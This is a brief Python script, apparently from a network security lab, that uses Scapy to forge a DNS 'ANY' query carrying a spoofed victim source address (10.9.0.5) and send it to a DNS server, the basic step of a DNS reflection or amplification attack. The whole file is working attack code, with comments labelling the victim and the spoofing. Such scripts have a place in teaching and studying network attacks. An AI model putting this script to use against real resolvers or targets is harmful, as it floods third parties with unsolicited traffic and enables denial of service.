from scapy.all import *

# Spoofing target/victim IP
victim_ip = "10.9.0.5"
dns_server_ip = "10.9.0.53"

# Create DNS query with spoofed source IP
dns_request = IP(src=victim_ip, dst=dns_server_ip) / \
              UDP(sport=RandShort(), dport=53) / \
              DNS(rd=1, qd=DNSQR(qname="smith2022.edu", qtype="ANY"))

# Send the spoofed packet
send(dns_request, verbose=1)
